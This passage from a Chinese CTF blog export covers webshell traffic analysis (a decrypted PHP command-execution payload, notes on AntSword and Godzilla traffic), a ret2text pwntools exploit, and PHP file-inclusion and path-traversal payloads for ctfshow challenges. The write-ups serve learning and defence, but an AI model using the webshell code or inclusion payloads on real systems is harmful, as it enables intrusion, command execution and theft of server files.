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</span><br></pre></td></tr></table></figure>



<p>解密后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getSafeStr($str)&#123;</span><br><span class="line">    $s1 = iconv(&#x27;utf-8&#x27;,&#x27;gbk//IGNORE&#x27;,$str);</span><br><span class="line">    $s0 = iconv(&#x27;gbk&#x27;,&#x27;utf-8//IGNORE&#x27;,$s1);</span><br><span class="line">    if($s0 == $str)&#123;</span><br><span class="line">        return $s0;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return iconv(&#x27;gbk&#x27;,&#x27;utf-8//IGNORE&#x27;,$str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function main($cmd)</span><br><span class="line">&#123;</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">    @ignore_user_abort(1);</span><br><span class="line">    @ini_set(&#x27;max_execution_time&#x27;, 0);</span><br><span class="line">    $result = array();</span><br><span class="line">    $PadtJn = @ini_get(&#x27;disable_functions&#x27;);</span><br><span class="line">    if (! empty($PadtJn)) &#123;</span><br><span class="line">        $PadtJn = preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $PadtJn);</span><br><span class="line">        $PadtJn = explode(&#x27;,&#x27;, $PadtJn);</span><br><span class="line">        $PadtJn = array_map(&#x27;trim&#x27;, $PadtJn);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $PadtJn = array();</span><br><span class="line">    &#125;</span><br><span class="line">    $c = $cmd;</span><br><span class="line">    if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27;)) &#123;</span><br><span class="line">        $c = $c . &quot; 2&gt;&amp;1\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $JueQDBH = &#x27;is_callable&#x27;;</span><br><span class="line">    $Bvce = &#x27;in_array&#x27;;</span><br><span class="line">    if ($JueQDBH(&#x27;system&#x27;) and ! $Bvce(&#x27;system&#x27;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;proc_open&#x27;) and ! $Bvce(&#x27;proc_open&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $handle = proc_open($c, array(</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;r&#x27;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;w&#x27;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;w&#x27;</span><br><span class="line">            )</span><br><span class="line">        ), $pipes);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        while (! feof($pipes[1])) &#123;</span><br><span class="line">            $kWJW .= fread($pipes[1], 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close($handle);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;passthru&#x27;) and ! $Bvce(&#x27;passthru&#x27;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;shell_exec&#x27;) and ! $Bvce(&#x27;shell_exec&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = shell_exec($c);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;exec&#x27;) and ! $Bvce(&#x27;exec&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = array();</span><br><span class="line">        exec($c, $kWJW);</span><br><span class="line">        $kWJW = join(chr(10), $kWJW) . chr(10);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;exec&#x27;) and ! $Bvce(&#x27;popen&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $fp = popen($c, &#x27;r&#x27;);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        if (is_resource($fp)) &#123;</span><br><span class="line">            while (! feof($fp)) &#123;</span><br><span class="line">                $kWJW .= fread($fp, 1024);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose($fp);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $kWJW = 0;</span><br><span class="line">        $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">        $result[&quot;msg&quot;] = base64_encode(&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;);</span><br><span class="line">        $key = $_SESSION[&#x27;k&#x27;];</span><br><span class="line">        echo encrypt(json_encode($result), $key);</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode(getSafeStr($kWJW));</span><br><span class="line">    echo encrypt(json_encode($result),  $_SESSION[&#x27;k&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">        if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">                for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">                         $data[$i] = $data[$i]^$key[$i+1&amp;15];</span><br><span class="line">                        &#125;</span><br><span class="line">                        return $data;</span><br><span class="line">        &#125;</span><br><span class="line">    else</span><br><span class="line">        &#123;</span><br><span class="line">                return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;$cmd=&quot;cat GronKey.txt&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure>

<p>对应返回包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php decropt.php -k 2295d22e2d70888f -a w5lcFkJ5g/LtCqI0NgGN0nr2fGo9r1/AzKUMpzC878J4hU17Fu2Q89EMiYBl3hWbGAewU7bpnuWx4oBUmohKkg==</span><br></pre></td></tr></table></figure>

<p>解密结果</p>
<p>$cmd&#x3D;”cat GronKey.txt”;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;1,50,61,8,9,20,63,41&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>tcp流三</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#125;$cmd=&quot;cat flag.txt&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>tcp流2</p>
<p>Vigenere解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = [1,50,61,8,9,20,63,41]</span><br><span class="line">import string</span><br><span class="line">dic = string.ascii_lowercase</span><br><span class="line">key = &#x27;&#x27;</span><br><span class="line">for k in s:</span><br><span class="line">    key += dic[k%26]</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>

<p>解的维吉尼亚的key </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def decrypt_string(ciphertext, offsets):</span><br><span class="line">    decrypted_string = &quot;&quot;</span><br><span class="line">    offset_index = 0</span><br><span class="line"></span><br><span class="line">    for char in ciphertext:</span><br><span class="line">        offset = offsets[offset_index] % 26</span><br><span class="line">        decrypted_char_code = (ord(char) - ord(&#x27;A&#x27;) - offset) % 26 + ord(&#x27;A&#x27;)</span><br><span class="line">        decrypted_char = chr(decrypted_char_code)</span><br><span class="line">        decrypted_string += decrypted_char</span><br><span class="line"></span><br><span class="line">        offset_index = (offset_index + 1) % len(offsets)</span><br><span class="line"></span><br><span class="line">    return decrypted_string</span><br><span class="line"></span><br><span class="line">ciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;</span><br><span class="line">offsets = [1, 50, 61, 8, 9, 20, 63]</span><br><span class="line">decrypted_string = decrypt_string(ciphertext, offsets)</span><br><span class="line">print(decrypted_string)</span><br></pre></td></tr></table></figure>



<h1 id="蚁剑流量"><a href="#蚁剑流量" class="headerlink" title="蚁剑流量"></a>蚁剑流量</h1><p>流量特征</p>
<p><a href="https://blog.csdn.net/UserNick157/article/details/124405353">中国蚁剑流量分析-CSDN博客</a></p>
<h1 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h1><p>流量特征</p>
<p>哥斯拉的作者应该还没有意识到，在请求包的Cookie中有一个非常致命的特征，最后的分号</p>
<p>通过Burp抓包可知，第1个请求会发送大量数据，该请求不含有任何Cookie信息，服务器响应报文不含任何数据，但是会设置PHPSESSID，后续请求都会自动带上该Cookie</p>
<p><a href="https://blog.csdn.net/sinat_31884905/article/details/132548617">【流量分析】Godzilla分析_哥斯拉流量特征-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn入门</title>
    <url>/2024/04/05/pwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p> 二进制安全新手</p>
<span id="more"></span>

<p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p>
<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>CALL 指令：</p>
<p>CALL 指令用于调用一个子程序（或称为过程或函数）。它实现了一种跳转到其他代码块执行的机制，但与 JMP 不同，CALL 在执行跳转之前会将当前指令的下一条指令地址入栈，以便在子程序执行完毕后能够返回到调用点。这为程序的模块化和结构化提供了基础，使得代码更易于理解和维护。</p>
<p>RET 指令：</p>
<p>RET 指令与 CALL 相对应，用于从子程序中返回到调用点。它从栈中弹出之前保存的返回地址，将程序的控制流恢复到调用点，实现了子程序的返回操作。RET 的使用使得程序能够方便地从一个子程序切换回到主程序，完成所需的计算和任务。</p>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>函数状态主要涉及三个寄存器－－esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
<p><strong>栈从高地址向低地址生长，ebp高地址，esp低地址，</strong></p>
<p>rbp 64 位寄存器 ebp 32 位寄存器</p>
<p>由此可见 main函数的返回地址在 rbp+8的地址上</p>
<p>bss段<br>bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。</p>
<p>bss是英文Block Started by Symbol的简称。</p>
<p>bss段属于静态内存分配。<br>比如</p>
<p>int a;</p>
<p>data段<br>数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。</p>
<p>数据段属于静态内存分配。<br>比如</p>
<p>int a&#x3D; 1<br>text段<br>代码段（code segment&#x2F;text segment）通常是指用来存放程序执行代码的一块内存区域。</p>
<p>这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。</p>
<p>在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p>
<p>heap<br>堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。</p>
<p>当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；</p>
<p>当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p>
<p>stack<br>栈又称堆栈，是用户存放程序临时创建的局部变量，</p>
<p>也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。</p>
<p>除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。</p>
<p>由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存&#x2F;恢复调用现场。</p>
<p>从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。</p>
<p>一般般来说，我们会有如下的覆盖需求</p>
<ul>
<li><p><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</p>
</li>
<li><p><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</p>
</li>
<li><p><strong>覆盖 bss 段某个变量的内容</strong>。</p>
</li>
<li><p>根据现实执行情况，覆盖特定的变量或地址的内容。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>jarvisoj_level0，可在buuctf网站中下载。首先使用checksec工具查看它开了啥保护措施，基本全关。</p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/1.jpg" alt="1.jpg"></p>
<p>然后我们使用ida查看一下该程序，程序很简单,有明显的栈溢出漏洞和后门函数，后门函数地址就为0x40059A。</p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/2.jpg" alt="2.jpg"></p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/3.jpg" alt="3.jpg"></p>
<p>ida帮我们计算出来了buf字符串距离rbp有0x80个字节，由于rbp本身还占8个字节，所以溢出0x88个字节后将返回地址修改为后门函数的地址exp如下。</p>
<p>手动打断点调试如下</p>
<p><img src="https://s2.loli.net/2024/04/07/W1R2hABJXKDn8fE.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./level0&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27644</span>)</span><br><span class="line">sys_addr = <span class="number">0x40059A</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上） - 知乎 (zhihu.com)</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a>)</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>php文件包含</title>
    <url>/2024/04/04/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p> 记录一些遇到的文件包含的知识点和题目，会不断更新</p>
<span id="more"></span>

<p>PHP常见的伪协议如下：</p>
<p>文件包含函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include()：遇到错误生成警告，继续执行脚本</span><br><span class="line">require()：遇到错误生成致命错误，脚本继续</span><br><span class="line">include_once()：如果文件已包含，则不再进行包含，一定程度避免错误</span><br><span class="line">require()_once()：如果文件已包含，则不再进行包含，一定程度避免错误</span><br><span class="line">fopen()，file_get_contents()等：文件读取函数</span><br></pre></td></tr></table></figure>

<p>文件读取函数：</p>
<p>copy,file_get_contents()highlight_file()fopen()read file()fread()fgetss()fgets()parse_ini_file()show_source()file()</p>
<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p>php:&#x2F;&#x2F;input（allow_url_include&#x3D;On）</p>
<blockquote>
<p>遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造?file=php://input</span><br><span class="line">post data中输入：&lt;?php system(&#x27;dir&#x27;);?&gt;    //代码表示显示所有文件目录</span><br><span class="line">根据显示的文件目录直接进行访问（某txt或php文件），得到flag</span><br></pre></td></tr></table></figure>

<p>php:&#x2F;&#x2F;filter</p>
<blockquote>
<p>可以使用的函数：readfile()、file()、file_get_contents()、include()</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>data:&#x2F;&#x2F;</p>
<blockquote>
<p>要求allow_url_fopen&#x3D;On，allow_url_include&#x3D;On</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php phpinfo()?&gt;    //执行phpinfo()</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=    //将命令进行base64加密，编码为“&lt;?php phpinfo()?&gt; ”的base64编码</span><br><span class="line">?file=data:text/plain,&lt;?php phpinfo()?&gt;    //去掉双斜杠</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>

<p>zip:&#x2F;&#x2F;</p>
<blockquote>
<p>zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。<br>zip:&#x2F;&#x2F;中只能传入<strong>绝对路径</strong>；要用#分隔压缩包和压缩包里的内容，且#要用url编码**%23**代替</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=zip://D:\file.zip%23flag.txt</span><br></pre></td></tr></table></figure>

<ol>
<li>D:\file.zip表示压缩包的绝对路径</li>
<li>后跟%23分割压缩包和压缩包中要访问的文件名</li>
</ol>
<p>phar:&#x2F;&#x2F;</p>
<blockquote>
<p>类似zip:&#x2F;&#x2F;，相对路径和绝对路径都可以使用，不管后缀名是什么都会将文件当作压缩包解压</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=phar://D:\file.zip\flag.txt    //绝对路径</span><br><span class="line">?file=phar://file.zip\flag.txt    //相对路径</span><br></pre></td></tr></table></figure>

<p>file:&#x2F;&#x2F;<br>用法：<br><code>file://</code>[本地文件系统的绝对路径]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=file:///etc/passsword</span><br></pre></td></tr></table></figure>

<p>三个&#x2F; 第三个杠是根目录上的杠</p>
<h2 id="字符过滤器"><a href="#字符过滤器" class="headerlink" title="字符过滤器"></a>字符过滤器</h2><p>string.*</p>
<p>string.rot13</p>
<p>（自 PHP 4.3.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.str-rot13.php">str_rot13()</a>函数处理所有的流数据。</p>
<p>str_rot13 — 对字符串执行 ROT13 转换. <strong>ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</strong></p>
<p>string.toupper</p>
<p>使用此过滤器等同于用 strtoupper()函数处理所有的流数据。</p>
<p>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtolower.php">strtolower()</a>函数处理所有的流数据。</p>
<p>strtoupper — 将字符串转化为大写</p>
<p>string.tolower</p>
<p>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtolower.php">strtolower()</a>函数处理所有的流数据。</p>
<p>strtolower — 将字符串转化为小写</p>
<p>string.strip_tags</p>
<p>使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()</a>函数处理所有的流数据。可以用两种格式接收参数：一种是和 strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</p>
<p>strip_tags — 从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 fgetss() 一样的机制去除标记。</p>
<h2 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h2><p>convert.*</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">convert.base64-encode`和`convert.base64-decode</span><br></pre></td></tr></table></figure>

<p>convert.quoted</p>
<h1 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h1><p>​       一些ctf零散记录，</p>
<h2 id="多级绕过"><a href="#多级绕过" class="headerlink" title="多级绕过"></a>多级绕过</h2><p>ctfshow 113</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;  <span class="comment">// 多级绕过</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>



<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><p>129</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;f&#x27;]))&#123;</span><br><span class="line">    $f = $_GET[&#x27;f&#x27;];</span><br><span class="line">    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;</span><br><span class="line">        echo readfile($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>readfile() 函数读取一个文件，并写入到输出缓冲。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=/ctfshow/../../../../../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure>

